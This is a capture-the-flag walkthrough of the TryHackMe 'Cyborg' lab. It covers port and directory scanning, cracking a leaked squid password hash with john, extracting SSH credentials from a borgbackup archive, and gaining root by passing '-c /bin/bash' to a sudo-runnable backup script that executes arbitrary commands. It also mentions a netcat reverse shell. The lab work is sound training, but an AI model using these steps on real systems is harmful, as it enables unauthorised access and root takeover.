# 20 - Cyborg

Room Link --> [https://tryhackme.com/room/cyborgt8](https://tryhackme.com/room/cyborgt8)

### Enumeration <a href="#nmap" id="nmap"></a>

From scan `nmap -v -sV -p- -o nmap-cyborg.txt 10.10.148.181`

{% code overflow="wrap" lineNumbers="true" %}
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

#### Gobuster[​](https://ronamosa.io/docs/hacker/tryhackme/cyborg/#gobuster) <a href="#gobuster" id="gobuster"></a>

`gobuster dir -u http://10.10.57.219 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,js,txt -t 500 2>/dev/null`

```
http://10.10.19.193/.hta                 (Status: 403) [Size: 277]
http://10.10.19.193/.htaccess            (Status: 403) [Size: 277]
http://10.10.19.193/.htpasswd            (Status: 403) [Size: 277]
http://10.10.19.193/admin                (Status: 301) [Size: 312] [--> http://10.10.19.193/admin/]
http://10.10.19.193/etc                  (Status: 301) [Size: 310] [--> http://10.10.19.193/etc/]
http://10.10.19.193/index.html           (Status: 200) [Size: 11321]
http://10.10.19.193/server-status        (Status: 403) [Size: 277]
```

Browse to `http://10.10.19.193/etc/squid/passwd` and find `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`

#### Crack it with john

`john passwd --wordlist=/usr/share/wordlists/rockyou.txt` .

<figure><img src=".gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

We got a username and password: `music_archive:squidward` .

#### Continue web enumeration

Navigate to `http://10.10.57.219/etc/squid/squid.conf`

<figure><img src=".gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Navigate to `http://10.10.57.219/admin/admin.html`

There is an "archive.tar" file there. Extract it, read the README file,  and see its a "Borgbackup" file.

I installed the `borgbackup` repository using `apt`.

```
sudo apt-get install borgbackup
```

Reading through the documentation, I first understood what `borgbackup` was.

<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/cyborg/13.png" alt=""><figcaption></figcaption></figure>

On the man pages we see how to extract an archive file.

<figure><img src="https://cryptichacker.github.io/assets/img/tryhackme/cyborg/12.png" alt=""><figcaption></figcaption></figure>

### Initial Access

After extraction, we navigated and found a credential for ssh.

<figure><img src=".gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

<figure><img src=".gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

We can run the "/etc/mp3backups/backup.sh" file as root.

{% code overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cm
```
{% endcode %}

This part looks the most interesting because it's allowing a command to be injected in here, running as root.

```bash
while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done
```

This [page](https://www.howtogeek.com/778410/how-to-use-getopts-to-parse-linux-shell-script-options/) explains how `getopts` works by letting you set the characters used to trigger the cases.

I try adding a `-c /bin/bash` to the backup script, and got root. But there is no output.

We can setup nc in another terminal, then run bash one-liner rev shell.

<figure><img src=".gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

Done.

